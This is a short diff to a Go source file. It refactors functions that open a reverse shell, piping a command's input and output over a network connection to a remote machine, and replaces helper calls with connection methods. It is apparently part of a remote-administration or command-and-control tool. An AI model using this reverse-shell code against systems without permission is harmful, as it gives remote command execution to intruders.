@@ -39,8 +39,8 @@ func initiateReverseShellOut(c comms.Connection) {
 		return
 	}
 
-	cmdOutErr := comms.CopyToConnection(cmdOut, c)
-	cmdInErr := comms.CopyFromConnection(c, cmdIn)
+	cmdOutErr := c.GoReadFrom(cmdOut)
+	cmdInErr := c.GoWriteTo(cmdIn)
 
 	err = cmd.Start()
 	if err != nil {
@@ -58,7 +58,7 @@ func initiateReverseShellOut(c comms.Connection) {
 
 // ReverseShellReply starts a reverse shell from the current machine to the address of the given connection.
 func ReverseShellReply(c comms.Connection) error {
-	reverseShellConn, err := comms.DupeCon(c)
+	reverseShellConn, err := c.NewConnectionToRemote()
 	if err != nil {
 		// For this to happen something must have gone wrong on the server (or the network dropped).
 		return err
@@ -79,7 +79,7 @@ func ReverseShellSend(man conman.ConMan) (err error) {
 	defer reverseShellConnection.Close()
 
 	fmt.Println("Type `exit` to leave the shell at any time")
-	_ = comms.CopyFromConnection(reverseShellConnection, os.Stdout)
+	_ = reverseShellConnection.GoWriteTo(os.Stdout)
 
 	for {
 		reader := bufio.NewReader(os.Stdin)
